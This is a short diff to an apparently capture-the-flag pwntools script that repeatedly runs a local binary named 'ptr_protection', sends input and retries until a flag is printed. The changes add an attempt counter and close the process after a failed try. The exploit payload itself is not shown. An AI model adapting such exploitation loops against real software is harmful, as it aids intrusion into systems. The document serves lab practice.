@@ -8,6 +8,7 @@ def int_to_byte(r):
 context.arch = 'amd64'
 
 exit = False
+count = 1
 while not exit:
 	if(len(sys.argv) > 1):
 		if(sys.argv[1] == '--debug'):
@@ -26,6 +27,8 @@ while not exit:
 	else:
 		p = process("./ptr_protection")
 
+	print('%d° tentative' % count)
+	count += 1
 	p.recv()
 	p.sendline(b'40')
 	p.recv()
@@ -45,6 +48,7 @@ while not exit:
 		print(flag)
 		exit = True
 	except:
+		p.close()
 		continue
 
 	if(exit == True): break
